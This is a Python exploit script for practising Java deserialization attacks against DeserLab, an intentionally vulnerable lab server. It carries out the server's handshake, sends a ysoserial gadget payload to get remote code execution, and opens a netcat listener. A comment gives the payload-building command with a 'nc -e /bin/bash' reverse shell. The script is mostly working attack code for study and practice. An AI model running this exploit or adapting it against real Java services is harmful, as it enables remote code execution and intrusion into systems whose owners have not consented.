#/usr/bin/env python
#
# Exploit Title       : Practicing Java Deserialization Exploits
# Author              : wetw0rk
# Vulnerable Software : https://github.com/NickstaDB/DeserLab
#
# Usage : DeserLab is an intentionally vulnerable server that
#         is vulnerable to java deserialization. This exploit
#         leverages the vulnerability within the application.
#

import os
import sys
import socket
import struct

class serial_killer():

  def __init__(self, rhost, rport):
    self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    self.rhost = rhost
    self.rport = int(rport)

  def connect(self):
    '''
    Connect to the server and specify data sent will be serialized
    '''
    self.sock.connect((self.rhost, self.rport))
    self.sock.sendall(
      '\xac\xed' # STREAM_MAGIC
      '\x00\x05' # STREAM_VERSION
    )
    print("[*] Got STREAM_MAGIC, and STREAM_VERSION: %s" %
        self.sock.recv(4).encode('hex'))

    # start normal traffic 
    self.send_hello()
    self.send_version()
    self.send_name()

  def send_hello(self):
    '''
    We know based on the PCAP gathered to expect bytes 0x77, 0x04.
    Here we unpack byte as an `unsigned integer` and remove ','.
    Based on 0x04 (and wireshark) we should get 0xf000baaa
    '''
    pkt = self.sock.recv(2) # \x77\x04
    datalength = int(struct.unpack('B', pkt[1])[0]) 
    print("[*] Getting TC_BLOCKDATA (you had me at hello): %s" %
        self.sock.recv(datalength).encode('hex'))
    
    self.sock.sendall(
      '\x77'             # TC_BLOCKDATA
      '\x04'             # Length: 0x04
      '\xf0\x00\xba\xaa' # Contents: 0xf000baaa
    )
        
  def send_version(self):
    '''
    Once we recieve the server version we send our client version
    '''
    pkt = self.sock.recv(2)
    datalength = int(struct.unpack('B', pkt[1])[0])
    print("[*] More TC_BLOCKDATA (version from server): %s" %
        self.sock.recv(datalength).encode('hex'))
    
    self.sock.sendall(
      '\x77'      # TC_BLOCKDATA
      '\x02'      # Length: 0x02
      '\x01\x01'  # Contents: 0x0101
    )

  def send_name(self):
    '''
    With the client version send, we now send our client name
    '''
    print "[*] Sending TC_BLOCKDATA (our name)"
    self.sock.sendall(
      '\x77'      # TC_BLOCKDATA
      '\x09'      # Length: 0x09
      '\x00\x07'  # Length: 0x07
      'wetw0rk'   # wetw0rk == 7 bytes
    )

  # java -jar ysoserial.jar Groovy1 'nc -e /bin/bash 127.0.0.1 12' > payload.bin
  def exploit(self, payload_file):
    '''
    With our client name sent, we send a string to hash, only
    this time we will send our payload
    '''
    payload = ""
    with open(payload_file, 'rb') as content_file:
      payload = content_file.read()
    
    self.sock.sendall(payload[4:])
    print "[+] Exploitation was a SUCC-ess, payload triggered"
    os.system("nc -lp 12")

try:
  target  = sys.argv[1]
  port    = sys.argv[2]
  payloadf= sys.argv[3]
except:
  print "Usage ./%s <target> <port> <payload file>" % sys.argv[0]
  exit()

start = serial_killer(target, port)
start.connect()
start.exploit(payloadf)
